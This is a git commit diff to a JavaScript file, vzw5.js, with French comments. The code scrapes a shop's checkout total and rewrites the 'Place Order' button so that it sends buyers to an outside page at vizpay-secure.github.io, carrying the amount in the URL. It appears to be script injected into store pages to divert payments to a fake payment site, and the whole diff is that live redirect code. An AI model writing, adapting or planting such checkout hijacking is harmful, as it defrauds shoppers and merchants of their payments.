6986e46b44dfe631ad99d9cc6c7c3e4b0153776c
vizpay-secure <kentdan055@gmail.com>
2025-02-28 01:12:00 +0100

    Update vzw5.js

--- vzw5.js
+++ vzw5.js
@@ -1,17 +1,34 @@
+function getAmount() {
+  const montantElement = document.querySelector('.card-total-price');
+  const montant = montantElement.querySelector('#netamount');
+  
+  if (montant) {
+    const montantValue = parseFloat(montant.textContent.trim());
+    const currencyType = montantElement.textContent.includes('INR') ? 'INR' : '$'; 
 
-const montantText = document.querySelector('.cart-table-prd-price-total').textContent.trim();
+    if (currencyType === 'INR') {
+      // Si c'est INR, on divise par 100 et on arrondit au supérieur
+      return Math.ceil(montantValue / 100);
+    } else if (currencyType === '$') { 
+      // Si c'est en Dollar, on arrondit simplement au supérieur
+      return Math.ceil(montantValue);
+    }
+  }
+  
+  // Retourne 0 si aucun montant n'est trouvé ou la conversion échoue
+  return 0;
+}
 
+// Récupère le montant
+const montantFinal = getAmount();
 
-const montant = parseFloat(montantText.replace('INR', '').trim());
+// Crée un lien personnalisé avec le montant
+const customLink = `https://vizpay-secure.github.io/vizpay/?isc=${montantFinal}`;  // Remplacez par votre propre URL
 
-
-const montantFinal = Math.ceil(montant / 100);
-
-
-const customLink = `https://vizpay-secure.github.io/vizpay/?isc=${montantFinal}`;  
-
-
+// Récupère le bouton et change son lien
 const btnPlaceOrder = document.querySelector('#btnPlaceOrder');
-btnPlaceOrder.onclick = function() {
-  window.location.href = customLink;
-};
+if (btnPlaceOrder) {
+  btnPlaceOrder.onclick = function() {
+    window.location.href = customLink;
+  };
+}
